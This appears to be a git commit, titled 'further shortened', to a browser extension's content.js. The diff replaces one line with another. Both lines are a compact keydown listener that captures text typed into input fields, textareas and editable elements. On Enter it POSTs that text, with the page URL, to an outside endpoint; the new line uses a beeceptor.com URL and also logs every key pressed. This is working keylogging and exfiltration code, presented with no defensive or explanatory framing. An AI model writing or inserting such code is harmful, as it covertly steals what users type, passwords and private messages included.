edb0b502c4d7d4d390d85204daa9843c89dcc8b0
zedpaixd <planta636@gmail.com>
2025-02-26 00:17:26 +0200

    further shortened

--- content.js
+++ content.js
@@ -1,1 +1,1 @@
-document.addEventListener('keydown',e=>{e.key==='Enter'&&(t=e.target).matches('input,textarea,[contenteditable]')&&fetch('API-LINK',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:(t.value||t.textContent),url:document.URL})})});
+document.addEventListener('keydown',e=>console.log(e.key)||e.key==='Enter'&&fetch('https://semin.free.beeceptor.com',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:(e.target.value||e.target.textContent),url:document.URL})}));
